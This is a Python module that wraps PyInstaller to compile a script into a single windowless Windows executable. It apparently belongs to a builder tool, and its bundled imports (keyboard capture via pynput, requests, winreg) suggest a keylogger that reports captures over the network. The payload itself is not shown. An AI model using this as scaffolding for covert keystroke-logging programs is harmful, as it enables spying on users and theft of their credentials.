"""
Compilation module for building executables.
"""

import subprocess
from pathlib import Path
from typing import TYPE_CHECKING
from ui.display import DisplayManager

if TYPE_CHECKING:
    from config.settings import BuilderConfig


class Compiler:
    """Handles compilation of Python scripts to executables."""
    
    def __init__(self, config: 'BuilderConfig'):
        self.config = config
        self.display = DisplayManager()
        
    def compile_to_exe(self, source_file: Path, output_dir: Path) -> bool:
        """Compile the Python script to an executable."""
        self.display.print_info("Compiling to executable...")
        
        # PyInstaller command with hidden imports
        cmd = [
            'pyinstaller',
            '--onefile',
            '--noconsole' if not self.config.features['debug_mode'] else '--console',
            '--hidden-import', 'pynput',
            '--hidden-import', 'pynput.keyboard',
            '--hidden-import', 'requests',
            '--hidden-import', 'winreg',
            '--distpath', str(output_dir),
            '--workpath', str(output_dir / 'build'),
            '--specpath', str(output_dir),
            str(source_file)
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                self.display.print_success("Compilation successful!")
                return True
            else:
                self.display.print_error(f"Compilation failed: {result.stderr}")
                return False
        except FileNotFoundError:
            self.display.print_error("PyInstaller not found. Please install it with: pip install pyinstaller")
            return False 